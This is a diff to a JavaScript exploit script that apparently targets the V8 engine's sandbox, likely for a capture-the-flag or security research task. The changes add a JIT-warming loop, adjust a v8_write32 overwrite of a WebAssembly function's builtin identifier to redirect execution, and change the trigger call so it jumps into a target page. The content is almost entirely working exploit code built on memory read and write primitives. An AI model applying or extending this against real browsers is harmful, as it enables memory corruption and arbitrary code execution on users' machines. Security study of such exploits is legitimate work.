@@ -31,6 +31,24 @@ let target_page = BigInt(Sandbox.targetPage);
 console.log("target_page: 0x" + target_page.toString(16));
 // ================================================================
 
+
+// const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x200});
+// const u16arr = new Uint16Array(gsab,0x10);
+// u16arr[1] = 1;
+// console.log(u16arr[1]);
+
+function foo(obj,index, val) {
+    obj[index] += val;
+    return obj[index];
+
+}
+
+for (var i = 0; i < 0x10000; ++i) {
+    foo([], 1,0);
+}
+
+%DebugPrint(foo);
+// =================================================================
 const builder = new WasmModuleBuilder();
 builder.exportMemoryAs("mem0", 0);
 const GB = 1024 * 1024 * 1024;
@@ -71,10 +89,19 @@ console.log("0x" + id_builtins_function.toString(16));
 //  Command failed with offset 0x4f
 // 0x336: Builtins_FulfillPromise
 // 0x14a6
-v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x12d4)*0x200);
+// 0x15fc-0x144f
+// 0x12d4
+// 1027
+// 0x2000 -> call jit
+// console.log(arguments[0]);
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x2000)*0x200);
+// v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1035)*0x200);
 console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
 
+// 
+// v8_write32(0x1f0000n, 0x41414141);
+// v8_write64(0x200145n - 1n, 0x4141414142424242n);
 
 // trigger
-instance.exports.func1(Number(target_page));
+instance.exports.func1(Number(target_page+1n));
 
